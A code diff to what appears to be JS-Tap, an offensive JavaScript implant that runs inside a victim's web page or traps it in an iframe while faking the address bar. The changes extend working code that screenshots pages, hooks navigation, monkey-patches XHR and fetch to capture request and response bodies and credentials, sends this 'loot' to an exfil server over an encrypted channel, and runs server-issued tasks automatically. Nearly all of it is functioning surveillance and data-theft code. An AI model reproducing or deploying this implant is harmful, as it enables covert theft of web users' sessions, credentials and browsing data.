@@ -49,10 +49,10 @@ function initGlobals()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = "trap";
+	window.taperMode = window.taperMode ?? "trap";
 
 	// Exfil server
-	window.taperexfilServer = "https://127.0.0.1:8444";
+	window.taperexfilServer = window.taperexfilServer ?? "https://127.0.0.1:8444";
 
 
 	// Below settings only matter if you're in trap mode
@@ -105,7 +105,10 @@ function initGlobals()
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "wp";
+	window.taperTag = window.taperTag ?? "wp";
+
+	// Parent beacon UUID — set by BEX before loading, null for standalone
+	window.taperParentUUID = window.taperParentUUID ?? null;
 
 
 	// Should we fingerprint clients?
@@ -121,14 +124,6 @@ function initGlobals()
 
 	// Should we try to monkey patch underlying API prototypes?
 	window.monkeyPatchAPIs = false;
-
-
-	// Should we capture a screenshot after a delay after an API call?
-	// The data that came back from the API call might have been used to update
-	// the UI. Delay is in milliseconds
-	// Only used when monkeyPatchAPIs is true
-	window.postApiCallScreenshot = true;
-	window.screenshotDelay       = 1000;
 
 
 	// Should we check for tasks? How often?
@@ -149,11 +144,7 @@ function initGlobals()
 		sessionStorage.setItem('taperLastUrl', '');
 	}
 
-	// Slow down the html2canvas
-	window.taperloaded = false;
-
-
-	// Client UUID 
+	// Client UUID
 	if (!sessionStorage.hasOwnProperty('taperSessionUUID'))
 	{
 		sessionStorage.setItem('taperSessionUUID', '');
@@ -344,66 +335,265 @@ function canAccessIframe(iframe) {
 }
 
 
+function getIframeUrl() {
+	try {
+		var loc = document.getElementById("iframe_a").contentDocument.location;
+		return loc.pathname + loc.search + loc.hash;
+	} catch(e) {
+		return null;
+	}
+}
+
+function syncAddressBar() {
+	var url = getIframeUrl();
+	if (url && url !== 'blank' && url !== window._taperLastSyncedUrl) {
+		window.history.replaceState(null, '', url);
+		window._taperLastSyncedUrl = url;
+	}
+}
+
+function installSpaHooks() {
+	try {
+		var iframeWin = document.getElementById("iframe_a").contentWindow;
+		if (!iframeWin || !iframeWin.history) return;
+
+		if (iframeWin._taperSpaHooked) return;
+		iframeWin._taperSpaHooked = true;
+
+		var origPush = iframeWin.history.pushState;
+		var origReplace = iframeWin.history.replaceState;
+
+		iframeWin.history.pushState = function() {
+			origPush.apply(this, arguments);
+			syncAddressBar();
+			handleSpaNavigation();
+		};
+
+		iframeWin.history.replaceState = function() {
+			origReplace.apply(this, arguments);
+			syncAddressBar();
+			handleSpaNavigation();
+		};
+
+		iframeWin.addEventListener('popstate', function() {
+			syncAddressBar();
+			handleSpaNavigation();
+		});
+	} catch(e) {
+		// Cross-origin — can't hook, polling fallback handles it
+	}
+}
+
+function handleSpaNavigation() {
+	try {
+		var iframeLoc = document.getElementById("iframe_a").contentDocument.location;
+		var currentUrl = iframeLoc.pathname + iframeLoc.search + iframeLoc.hash;
+		var fullUrl = iframeLoc.href;
+
+		if (sessionStorage.getItem('taperLastUrl') !== currentUrl) {
+			sessionStorage.setItem('taperLastUrl', currentUrl);
+			sendUrlTelemetry(fullUrl);
+			scheduleLootCapture(300);
+		}
+	} catch(e) {
+		// Cross-origin — ignore
+	}
+}
+
+function installImplantSpaHooks() {
+	if (window._taperImplantSpaHooked) return;
+	window._taperImplantSpaHooked = true;
+
+	var origPush = history.pushState;
+	var origReplace = history.replaceState;
+
+	history.pushState = function() {
+		origPush.apply(this, arguments);
+		handleImplantSpaNavigation();
+	};
+
+	history.replaceState = function() {
+		origReplace.apply(this, arguments);
+		handleImplantSpaNavigation();
+	};
+
+	window.addEventListener('popstate', handleImplantSpaNavigation);
+}
+
+function handleImplantSpaNavigation() {
+	var currentUrl = document.location.pathname + document.location.search + document.location.hash;
+	var fullUrl = document.location.href;
+
+	if (sessionStorage.getItem('taperLastUrl') !== currentUrl) {
+		sessionStorage.setItem('taperLastUrl', currentUrl);
+		sendUrlTelemetry(fullUrl);
+		scheduleLootCapture(300);
+	}
+}
 
 
+var _lastScreenshotTime = 0;
+var _domScreenshotTimer = null;
+var _taperObserverPaused = false;
+
+function installDomObserver() {
+	var target;
+	if (window.taperMode === "trap") {
+		try {
+			target = document.getElementById("iframe_a").contentDocument.body;
+		} catch(e) {
+			return;
+		}
+	} else {
+		target = document.body;
+	}
+
+	if (!target) return;
+
+	var observer = new MutationObserver(function(mutations) {
+		if (_taperObserverPaused) return;
+
+		// Don't schedule if a loot capture is already pending
+		if (_lootCaptureTimer) return;
+
+		// Debounce: schedule screenshot 1.5s after last DOM change
+		if (_domScreenshotTimer) clearTimeout(_domScreenshotTimer);
+		_domScreenshotTimer = setTimeout(function() {
+			_domScreenshotTimer = null;
+
+			// Cooldown: skip if screenshot taken recently (within 3s)
+			if (Date.now() - _lastScreenshotTime < 3000) return;
+
+			_taperObserverPaused = true;
+			sendScreenshot();
+			// Unpause after html2canvas has time to clean up
+			setTimeout(function() { _taperObserverPaused = false; }, 2000);
+		}, 1500);
+	});
+
+	observer.observe(target, {
+		childList: true,
+		subtree: true
+	});
+
+	return observer;
+}
 
 
 function sendScreenshot() {
-	if (typeof html2canvas !== "function") {
-		console.error("html2canvas is not available.");
-		return;
+	_lastScreenshotTime = Date.now();
+	// Helper to run standard html2canvas capture
+	const runHtml2Canvas = () => {
+		if (typeof html2canvas !== "function") {
+			console.error("html2canvas is not available.");
+			return;
+		}
+
+		// Pick the right document reference
+		const myReference = (window.taperMode === "trap")
+		? document.getElementById("iframe_a").contentDocument
+		: document;
+
+		html2canvas(myReference.getElementsByTagName("html")[0], { 
+			scale: 1,
+			useCORS: true,           // Essential for Reddit CDN images
+			allowTaint: false,       // Keep false if using CORS
+			logging: true,           // Help debug in console
+			taintTest: false,
+			backgroundColor: "#ffffff", // Ensure it's not transparent
+			imageTimeout: 15000,     // Give images time to load
+			removeContainer: true
+		})
+		.then(canvas => {
+			canvas.toBlob(async (blob) => {
+				if (window.taperMetricsBox) {
+			  // Convert the blob to an ArrayBuffer for encryption
+					const arrayBuffer = await blob.arrayBuffer();
+			  // Generate a random IV for AES-GCM encryption
+					const ivArray = window.crypto.getRandomValues(new Uint8Array(12));
+			  // Encrypt the fixed path "/loot/screenshot" so your server knows how to handle it
+					const pathData = new TextEncoder().encode("/loot/screenshot");
+					const encryptedPath = await window.crypto.subtle.encrypt(
+						{ name: "AES-GCM", iv: ivArray },
+						window.taperMetricsBox,
+						pathData
+						);
+			  // Encrypt the screenshot data
+					const encryptedMessage = await window.crypto.subtle.encrypt(
+						{ name: "AES-GCM", iv: ivArray },
+						window.taperMetricsBox,
+						arrayBuffer
+						);
+			  // Convert the IV, encrypted path, and encrypted message to Base64 strings
+					const ivBase64 = arrayBufferToBase64(ivArray);
+					const pathBase64 = arrayBufferToBase64(encryptedPath);
+					const messageBase64 = arrayBufferToBase64(encryptedMessage);
+			  // Build the comma-separated payload string
+					const payloadString = ivBase64 + "," + pathBase64 + "," + messageBase64;
+					const payload = { metricData: payloadString };
+	
+			  // Send to the unified /client/metrics endpoint
+					const request = new window.taperXHR();
+					request.noIntercept = true;
+					request.open("POST", taperexfilServer + "/client/metrics/" + sessionStorage.getItem("taperSessionUUID"));
+					request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+					request.send(JSON.stringify(payload));
+				} else {
+			  // Send the plain screenshot blob to the unencrypted endpoint
+					const request = new window.taperXHR();
+					request.noIntercept = true;
+					request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getItem("taperSessionUUID"));
+					request.send(blob);
+				}
+			}, "image/png");
+		})
+		.catch(err => console.error("Error capturing screenshot:", err));
+	};
+
+	// 1. Try Hybrid BEX-Assist Screenshot first (if spawned by a beacon)
+	if (window.taperParentUUID) {
+		try {
+			const sessionUUID = sessionStorage.getItem("taperSessionUUID");
+			const isEncrypted = !!window.taperMetricsBox;
+			
+			// Setup one-time listener for result
+			const resultHandler = (event) => {
+				if (event.source !== window || event.data?.type !== "BEX_SCREENSHOT_RESULT") return;
+				
+				window.removeEventListener("message", resultHandler);
+				clearTimeout(fallbackTimer);
+				
+				if (event.data.success) {
+					console.log("JS-Tap: Hybrid screenshot success. Skipping html2canvas.");
+				} else {
+					console.log("JS-Tap: Hybrid screenshot skipped/failed (" + event.data.reason + "). Running html2canvas fallback.");
+					runHtml2Canvas();
+				}
+			};
+			window.addEventListener("message", resultHandler);
+
+			// Send message to BEX content script
+			window.postMessage({
+				type: "BEX_SCREENSHOT_REQUEST",
+				sessionUUID: sessionUUID,
+				isEncrypted: isEncrypted
+			}, "*");
+			
+			// Fallback timer in case extension is dead/slow
+			const fallbackTimer = setTimeout(() => {
+				window.removeEventListener("message", resultHandler);
+				console.log("JS-Tap: Hybrid screenshot timed out. Running html2canvas fallback.");
+				runHtml2Canvas();
+			}, 2000);
+
+			return; // Exit and wait for async result/timeout
+		} catch (e) {
+			// No beacon support, fall through
+		}
 	}
 
-  // Pick the right document reference
-	const myReference = (window.taperMode === "trap")
-	? document.getElementById("iframe_a").contentDocument
-	: document;
-
-	html2canvas(myReference.getElementsByTagName("html")[0], { scale: 1 })
-	.then(canvas => {
-		canvas.toBlob(async (blob) => {
-			if (window.taperMetricsBox) {
-          // Convert the blob to an ArrayBuffer for encryption
-				const arrayBuffer = await blob.arrayBuffer();
-          // Generate a random IV for AES-GCM encryption
-				const ivArray = window.crypto.getRandomValues(new Uint8Array(12));
-          // Encrypt the fixed path "/loot/screenshot" so your server knows how to handle it
-				const pathData = new TextEncoder().encode("/loot/screenshot");
-				const encryptedPath = await window.crypto.subtle.encrypt(
-					{ name: "AES-GCM", iv: ivArray },
-					window.taperMetricsBox,
-					pathData
-					);
-          // Encrypt the screenshot data
-				const encryptedMessage = await window.crypto.subtle.encrypt(
-					{ name: "AES-GCM", iv: ivArray },
-					window.taperMetricsBox,
-					arrayBuffer
-					);
-          // Convert the IV, encrypted path, and encrypted message to Base64 strings
-				const ivBase64 = arrayBufferToBase64(ivArray);
-				const pathBase64 = arrayBufferToBase64(encryptedPath);
-				const messageBase64 = arrayBufferToBase64(encryptedMessage);
-          // Build the comma-separated payload string
-				const payloadString = ivBase64 + "," + pathBase64 + "," + messageBase64;
-				const payload = { metricData: payloadString };
-
-          // Send to the unified /client/metrics endpoint
-				const request = new window.taperXHR();
-				request.noIntercept = true;
-				request.open("POST", taperexfilServer + "/client/metrics/" + sessionStorage.getItem("taperSessionUUID"));
-				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-				request.send(JSON.stringify(payload));
-			} else {
-          // Send the plain screenshot blob to the unencrypted endpoint
-				const request = new window.taperXHR();
-				request.noIntercept = true;
-				request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getItem("taperSessionUUID"));
-				request.send(blob);
-			}
-		}, "image/png");
-	})
-	.catch(err => console.error("Error capturing screenshot:", err));
+	// 2. Standard Fallback (No beacon)
+	runHtml2Canvas();
 }
 
 
@@ -865,6 +1055,32 @@ function getCookie(name)
 
 
 
+function sendUrlTelemetry(fullUrl) {
+    var jsonObj = new Object();
+    jsonObj["url"] = fullUrl;
+    var jsonString = JSON.stringify(jsonObj);
+
+    if (window.taperMetricsBox) {
+        sendMetrics("/loot/location", jsonString);
+    } else {
+        var request = new window.taperXHR();
+        request.noIntercept = true;
+        request.open("POST", taperexfilServer + "/loot/location/" +
+            sessionStorage.getItem('taperSessionUUID'));
+        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        request.send(jsonString);
+    }
+}
+
+var _lootCaptureTimer = null;
+function scheduleLootCapture(delay) {
+    if (_lootCaptureTimer) clearTimeout(_lootCaptureTimer);
+    _lootCaptureTimer = setTimeout(function() {
+        _lootCaptureTimer = null;
+        captureUrlChangeLoot();
+    }, delay);
+}
+
 // Function to hold loot stealing acalls
   function captureUrlChangeLoot()
   {
@@ -931,74 +1147,37 @@ function getCookie(name)
 			// console.log("Looks like canAccessIframe check passed!");
   		}
 
-  		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
-  		fullUrl    = document.getElementById("iframe_a").contentDocument.location.href;
+  		var iframeLoc = document.getElementById("iframe_a").contentDocument.location;
+  		currentUrl = iframeLoc.pathname + iframeLoc.search + iframeLoc.hash;
+  		fullUrl    = iframeLoc.href;
 		// console.log("in runUpdate currentUrl: " + currentUrl +", fullUrl: " + fullUrl);
   	}
   	else
   	{
-  		currentUrl = document.location.pathname;
-  		fullUrl    = document.location.href;		
+  		currentUrl = document.location.pathname + document.location.search + document.location.hash;
+  		fullUrl    = document.location.href;
   	}
 
-	// console.log("Checking last url: " + sessionStorage.getItem('taperLastUrl'));
 	// Let's see if the URL has changed
   	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
   	{
-		// Handle URL recording
-		// console.log("!!!!!!!! New trap URL, stealing the things: " + fullUrl);
   		sessionStorage.setItem('taperLastUrl', currentUrl);
-
-
-  		var jsonObj = new Object();
-  		jsonObj["url"] = fullUrl;
-  		var jsonString = JSON.stringify(jsonObj);
-
-  		if (window.taperMetricsBox)
-  		{
-			// We're go-go for encrypted comms!
-  			sendMetrics("/loot/location", jsonString);
-  		}
-  		else
-  		{
-			// Nope, regular mode
-  			request = new window.taperXHR();
-  			request.noIntercept = true;
-  			request.open("POST", taperexfilServer + "/loot/location/" + 
-  				sessionStorage.getItem('taperSessionUUID'));
-  			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-  			request.send(jsonString);
-  		}
-
+  		sendUrlTelemetry(fullUrl);
 
 		// We need to wait until the iframe/page has loaded to
-		// do HTML based looting. 
+		// do HTML based looting.
   		if (window.taperMode === "trap")
   		{
-			// if (currentUrl != 'blank')
-			// {
-			// 	window.history.replaceState(null, '', currentUrl);
-			// }
-		//	window.history.replaceState(null, '', currentUrl);
-			//captureUrlChangeLoot();
-
   			document.getElementById("iframe_a").onload = function() {
-				// console.log("+++ Onload ready!");
-
-				// Fake the URL that the user sees. 
-				// This is important for iFrame trap mode. 
-  				if (currentUrl != 'blank')
-  				{
-  					window.history.replaceState(null, '', currentUrl);
-  				}
-
+  				if (_lootCaptureTimer) { clearTimeout(_lootCaptureTimer); _lootCaptureTimer = null; }
+  				syncAddressBar();
+  				installSpaHooks();
   				captureUrlChangeLoot();
   			}
   		}
   		else
   		{
-			// console.log("$$ implant mode capturelUrlChangeLoot branch..");
-  			captureUrlChangeLoot();
+  			scheduleLootCapture(300);
   		}
   	}
 
@@ -1029,11 +1208,7 @@ function getCookie(name)
 
   	if (window.taperMode === "trap")
   	{
-		// Fake the URL that the user sees. This is important. 
-  		if (currentUrl != 'blank')
-  		{
-  			window.history.replaceState(null, '', currentUrl);
-  		}
+  		syncAddressBar();
   	}
 
 
@@ -1094,6 +1269,9 @@ function getCookie(name)
   		return;
   	}
 
+  	// Guard against fetch(url) calls with no options argument
+  	options = options || {};
+
   	const requestId = Symbol('fetchRequest');
 
 
@@ -1102,7 +1280,7 @@ function getCookie(name)
   		method:         options.method || 'GET',
   		url:            url,
   		headers:        options.headers,
-  		body:           btoa(options.body),
+  		body:           options.body ? btoa(options.body) : null,
   		responseStatus: null,
   		responseBody:   null
   	});
@@ -1154,13 +1332,6 @@ function getCookie(name)
   			}
 
 
-			// Check if we should take a screenshot now
-  			if (window.postApiCallScreenshot)
-  			{
-  				setTimeout(sendScreenshot, window.screenshotDelay);
-  			}
-
-
 			// Continue on like nothing is amiss
   			return response;
   		});
@@ -1175,141 +1346,98 @@ function getCookie(name)
 
 
 
-// Monkey patch API prototypes to intercept API calls
-// Only works for Trap mode, all sorts of bad things 
-// happen when we try to do this in implant mode
+// Monkey patch XHR prototypes to intercept API calls
+// Works in both trap and implant modes
   function monkeyPatchXHR()
   {
-	// console.log("** Enabling API monkey patches...");
+	var xhrProto = getXhrReference().prototype;
 
-	// XHR Part
-  	const xhrOriginalOpen      = window.XMLHttpRequest.prototype.open;
-  	const xhrOriginalSetHeader = window.XMLHttpRequest.prototype.setRequestHeader;
-  	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;
+	var origOpen      = xhrProto.open;
+	var origSetHeader = xhrProto.setRequestHeader;
+	var origSend      = xhrProto.send;
 
+	// Monkey patch open — initialize per-instance requestDetails
+	xhrProto.open = function(method, url, async, user, password) {
+		if (this.noIntercept) return origOpen.apply(this, arguments);
 
-	// Stash stuff for later access
-  	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.requestDetails = {
-  		method: null,
-  		url: null,
-  		headers: {},
-  		body: null,
-  		async: true,
-  		user: null,
-  		password: null,
-  		responseBody: null,
-  		responseStatus: null
-  	};
+		this.requestDetails = {
+			method: method,
+			url: url,
+			headers: {},
+			body: null,
+			async: async,
+			user: user,
+			password: password,
+			responseBody: null,
+			responseStatus: null
+		};
 
-
-	//Monkey patch open
-	// XHR monkeypatch only stable in trap mode
-  	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
-  	{
-  		var method = arguments[0];
-  		var url    = arguments[1];
-
-		// console.log("Intercepted XHR open: " + method + ", " + url);
-
-		// Stash it all
-  		this.requestDetails.method   = method;
-  		this.requestDetails.url      = url;
-  		this.requestDetails.async    = async;
-  		this.requestDetails.user     = user;
-  		this.requestDetails.password = password;
-
-  		xhrOriginalOpen.apply(this, arguments);
-  	}
-
-
+		origOpen.apply(this, arguments);
+	};
 
 	// Monkey patch setRequestHeader
-  	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
-  	{
-  		var header = arguments[0];
-  		var value  = arguments[1];
+	xhrProto.setRequestHeader = function(header, value) {
+		if (this.noIntercept) return origSetHeader.apply(this, arguments);
 
-		// Stash it
-  		this.requestDetails.headers[header] = value;
+		if (this.requestDetails) {
+			this.requestDetails.headers[header] = value;
+		}
 
-  		xhrOriginalSetHeader.apply(this, arguments);
-  	}
-
+		origSetHeader.apply(this, arguments);
+	};
 
 	// Monkey patch send
-  	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) {
-	    var originalOnReadyStateChange = this.onreadystatechange;  // Save the original handler
+	xhrProto.send = function(data) {
+		if (this.noIntercept) return origSend.apply(this, arguments);
 
-	    // Your interception logic
-	    var requestBody = btoa(data);
+		var originalOnReadyStateChange = this.onreadystatechange;
 
-	    // stash it
-	    this.requestDetails.body = requestBody;
+		if (this.requestDetails) {
+			this.requestDetails.body = btoa(data);
+		}
 
+		this.onreadystatechange = function() {
+			if (originalOnReadyStateChange) {
+				originalOnReadyStateChange.apply(this, arguments);
+			}
 
-	    this.onreadystatechange = function() {
-	        // Call the original handler first, if it exists
-	    	if (originalOnReadyStateChange) {
-	    		originalOnReadyStateChange.apply(this, arguments);
-	    	}
+			if (this.readyState === 4 && this.requestDetails) {
+				var respData;
 
-	        // Then do your logging
-	    	if (this.readyState === 4) {
-	    		var data;
+				if (!this.responseType || this.responseType === "text") {
+					respData = this.responseText;
+				} else if (this.responseType === "document") {
+					respData = this.responseXML;
+				} else if (this.responseType === "json") {
+					respData = JSON.stringify(this.response);
+				} else {
+					respData = this.response;
+				}
 
-	    		if (!this.responseType || this.responseType === "text") {
-	    			data = this.responseText;
-	    		} else if (this.responseType === "document") {
-	    			data = this.responseXML;
-	    		} else if (this.responseType === "json") {
-	    			data = JSON.stringify(this.response);
-	    		} else {
-	    			data = this.response;
-	    		}
+				this.requestDetails.responseBody   = btoa(respData);
+				this.requestDetails.responseStatus = this.status;
 
-	    		var responseBody = btoa(data);
+				var jsonString = JSON.stringify(this.requestDetails);
 
-           	// Stash the response
-	    		this.requestDetails.responseBody   = responseBody;
-	    		this.requestDetails.responseStatus = this.status;
+				if (window.taperMetricsBox)
+				{
+					sendMetrics("/loot/xhrRequest", jsonString);
+				}
+				else
+				{
+					var request = new window.taperXHR();
+					request.noIntercept = true;
+					request.open("POST", taperexfilServer + "/loot/xhrRequest/" +
+						sessionStorage.getItem('taperSessionUUID'));
+					request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+					request.send(jsonString);
+				}
+			}
+		};
 
-
-            // now the big dump
-           	// console.log("+++ XHR request dump: ")
-			    	// console.log(this.requestDetails);
-
-	    		var jsonString = JSON.stringify(this.requestDetails);
-
-	    		if (window.taperMetricsBox)
-	    		{
-							// We're go-go for encrypted comms!
-	    			sendMetrics("/loot/xhrRequest", jsonString);
-	    		}
-	    		else
-	    		{
-							// Nope, regular mode
-	    			request = new window.taperXHR();
-	    			request.noIntercept = true;
-	    			request.open("POST", taperexfilServer + "/loot/xhrRequest/" + 
-	    				sessionStorage.getItem('taperSessionUUID'));
-	    			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-	    			request.send(jsonString);
-	    		}
-	    	}
-	    };
-
-	    xhrOriginalSend.call(this, data);  // Ensure to use the original send
-	  };
-
-
-	//xhrOriginalSend.apply(this, arguments);
-
-	// Check if we should take a screenshot now
-	  if (window.postApiCallScreenshot)
-	  {
-	  	setTimeout(sendScreenshot, window.screenshotDelay);
-	  }
-	}
+		origSend.call(this, data);
+	};
+  }
 
 
 
@@ -1440,16 +1568,25 @@ function getCookie(name)
 			iframe.id = "iframe_a";
 			document.body.appendChild(iframe);
 
+		// Install SPA hooks and DOM observer whenever iframe loads a new page
+			document.getElementById('iframe_a').addEventListener('load', function() {
+				installSpaHooks();
+				installDomObserver();
+			});
+
 		// Just register all the darned events, each event in the iframe
 		// we'll call runUpdate()
 			var myReference = document.getElementById('iframe_a').contentDocument;
 			window.history.replaceState(null, '', taperstartingPage);
+			window._taperLastSyncedUrl = taperstartingPage;
 
 		}
 	else // implant mode
 	{
 		// console.log("Starting implant mode!");
 		myReference = document;
+		installImplantSpaHooks();
+		installDomObserver();
 	}
 
 	// Hook all the things
@@ -1463,17 +1600,8 @@ function getCookie(name)
 	// Monkey patch underlaying API calls?
 	if (window.monkeyPatchAPIs)
 	{
-		if (window.taperMode === "trap")
-		{
-			monkeyPatchXHR();
-			monkeyPatchFetch();
-		}
-		else
-		{
-			// Note that XHR monkeypatching 
-			// isn't working in implant mode
-			monkeyPatchFetch();
-		}
+		monkeyPatchXHR();
+		monkeyPatchFetch();
 	}
 
 	// Add timed just to make sure we get called
@@ -1500,16 +1628,14 @@ async function waitForMetricsBox()
 
 
 
-function hexToUint8Array(hexString) 
+function base64ToUint8Array(base64)
 {
-	if (hexString.length % 2 !== 0) {
-		throw new Error("Invalid hex string");
+	const binary = atob(base64);
+	const bytes = new Uint8Array(binary.length);
+	for (let i = 0; i < binary.length; i++) {
+		bytes[i] = binary.charCodeAt(i);
 	}
-	const arrayBuffer = new Uint8Array(hexString.length / 2);
-	for (let i = 0; i < hexString.length; i += 2) {
-		arrayBuffer[i / 2] = parseInt(hexString.substr(i, 2), 16);
-	}
-	return arrayBuffer;
+	return bytes;
 }
 
 
@@ -1626,75 +1752,71 @@ async function sendMetrics(path, message)
 
 
 
-// Check if we're using obfuscation and
-// setup our crypto objects if we are
+// Perform RSA-OAEP key exchange with the server
+// to securely receive AES encryption keys
 
 async function checkMetrics(token) {
+  // If WebCrypto is not available (e.g. insecure HTTP context), skip key exchange
+  if (!window.crypto || !window.crypto.subtle) {
+    return;
+  }
+
+  // Generate an ephemeral RSA-OAEP keypair
+  const rsaKeyPair = await window.crypto.subtle.generateKey(
+    {
+      name: "RSA-OAEP",
+      modulusLength: 2048,
+      publicExponent: new Uint8Array([1, 0, 1]),
+      hash: "SHA-256"
+    },
+    false,
+    ["decrypt"]
+  );
+
+  // Export the public key as SPKI/DER and base64-encode it
+  const publicKeyDer = await window.crypto.subtle.exportKey("spki", rsaKeyPair.publicKey);
+  const publicKeyBase64 = arrayBufferToBase64(publicKeyDer);
+
   return new Promise(async (resolve, reject) => {
-    const obRequest = new window.taperXHR();
-    obRequest.noIntercept = true;
+    const keyRequest = new window.taperXHR();
+    keyRequest.noIntercept = true;
 
-    obRequest.open("GET", window.taperexfilServer + "/client/metricSettings/" + token);
-    obRequest.onreadystatechange = async function() {
-      if (obRequest.readyState === XMLHttpRequest.DONE) {
-        if (obRequest.status === 200) {
+    keyRequest.open("POST", window.taperexfilServer + "/client/keyExchange/" + token);
+    keyRequest.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    keyRequest.onreadystatechange = async function() {
+      if (keyRequest.readyState === XMLHttpRequest.DONE) {
+        if (keyRequest.status === 200) {
           try {
-            const obJsonResponse = JSON.parse(obRequest.responseText);
-            if (obJsonResponse.enable === "true") {
-              // Pull out the keys from the obfuscated string.
-              const obfuscatedString = atob(obJsonResponse.metricDebug);
-              const obfuscatedData = new Uint8Array([...obfuscatedString].map(c => c.charCodeAt(0)));
-              
-              const idHex = token.replace(/-/g, '');
-              const idBytes = new Uint8Array(
-                idHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16))
+            const response = JSON.parse(keyRequest.responseText);
+            if (response.enable === "true") {
+              // Decrypt the RSA-OAEP encrypted AES keys
+              const encryptedBytes = base64ToUint8Array(response.encryptedKeys);
+              const decryptedBuffer = await window.crypto.subtle.decrypt(
+                { name: "RSA-OAEP" },
+                rsaKeyPair.privateKey,
+                encryptedBytes
               );
-              
-              const shift = 7 % idBytes.length;
-              const rotateBytes = new Uint8Array([
-                ...idBytes.slice(shift),
-                ...idBytes.slice(0, shift)
-              ]);
+              const decryptedKeys = new Uint8Array(decryptedBuffer);
 
-              const masker = new Uint8Array(obfuscatedData.length);
-              for (let i = 0; i < obfuscatedData.length; i++) {
-                masker[i] = rotateBytes[i % rotateBytes.length];
-              }
+              // First 32 bytes = sendKey, next 32 bytes = receiveKey
+              const sendKeyData    = decryptedKeys.slice(0, 32);
+              const receiveKeyData = decryptedKeys.slice(32, 64);
 
-              const plaintextData = new Uint8Array(obfuscatedData.length);
-              for (let i = 0; i < obfuscatedData.length; i++) {
-                plaintextData[i] = obfuscatedData[i] ^ masker[i];
-              }
-              
-              // Extract the two keys, one to send and one to receive.
-              const receiveKey = plaintextData.slice(0, 32);
-              const sendKey    = plaintextData.slice(32, 64);
-
-              // Convert the keys to hex strings for easier inspection.
-              const receiveKeyHex = Array.from(receiveKey)
-                .map(b => b.toString(16).padStart(2, '0'))
-                .join('');
-              const sendKeyHex = Array.from(sendKey)
-                .map(b => b.toString(16).padStart(2, '0'))
-                .join('');
-
-              // Setup our crypto API.
-              // `initMetrics` sends encrypted data, and `initCatcher` lets us decrypt received data.
-              await initMetrics(hexToUint8Array(sendKeyHex));
-              await initCatcher(hexToUint8Array(receiveKeyHex));
+              // Setup our crypto API
+              await initMetrics(sendKeyData);
+              await initCatcher(receiveKeyData);
             }
-            // Resolve the promise once processing is complete.
             resolve();
           } catch (e) {
             reject(e);
           }
         } else {
-          reject(new Error("HTTP error: " + obRequest.status));
+          reject(new Error("HTTP error: " + keyRequest.status));
         }
       }
     };
 
-    obRequest.send(null);
+    keyRequest.send(JSON.stringify({ publicKey: publicKeyBase64 }));
   });
 }
 
@@ -1721,14 +1843,19 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 		// Get our client UUID
 			request = new window.taperXHR();
 			request.noIntercept = true;
-			if (window.taperTag === "")
+			
+			var getTokenUrl = window.taperexfilServer + "/client/getToken";
+			if (window.taperTag !== "")
 			{
-				request.open("GET", window.taperexfilServer + "/client/getToken", true);
+				getTokenUrl += "/" + window.taperTag;
 			}
-			else
+			
+			if (window.taperParentUUID)
 			{
-				request.open("GET", window.taperexfilServer + "/client/getToken/" + window.taperTag, true);
+				getTokenUrl += "?parent=" + window.taperParentUUID;
 			}
+			
+			request.open("GET", getTokenUrl, true);
 			request.send(null);
 
 			request.onreadystatechange = async function()
@@ -1756,6 +1883,12 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 
     				// We're ready to trap all the things now
 						takeOver();
+
+						// Immediately check for tasks (autorun payloads)
+						if (window.taperTaskCheck) {
+							window.taperTaskUpdateScheduled = true;
+							checkTasks();
+						}
 
 						// console.log("------- Before fingerprinting code...");
 						getFingerprintHash().then(hash => {
@@ -1797,6 +1930,10 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 		// need to check for obfuscation again
 			await checkMetrics(sessionStorage.getItem('taperSessionUUID'));
 			takeOver();
+			if (window.taperTaskCheck) {
+				window.taperTaskUpdateScheduled = true;
+				checkTasks();
+			}
 			sendScreenshot();
 		}
 	})();
